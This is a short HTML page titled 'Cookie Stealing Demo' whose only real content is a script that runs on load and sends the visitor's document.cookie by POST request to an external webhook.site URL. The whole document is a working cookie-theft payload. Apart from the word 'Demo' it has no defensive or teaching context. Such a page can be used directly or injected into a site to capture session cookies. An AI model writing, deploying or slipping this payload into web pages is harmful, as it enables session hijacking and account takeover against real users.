<!DOCTYPE html>
<html>
<head>
  <title>Cookie Stealer</title>
</head>
<body>
  <h1>Cookie Stealing Demo</h1>
  <p>If this code is executed, it will send the cookies to the webhook.</p>
  <script>
    // Send cookies to the webhook URL
    fetch('https://webhook.site/9b449e10-e191-4711-92c7-76a92bc0691e', {
      method: 'POST',
      body: 'cookie=' + encodeURIComponent(document.cookie),
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });
  </script>
</body>
</html>
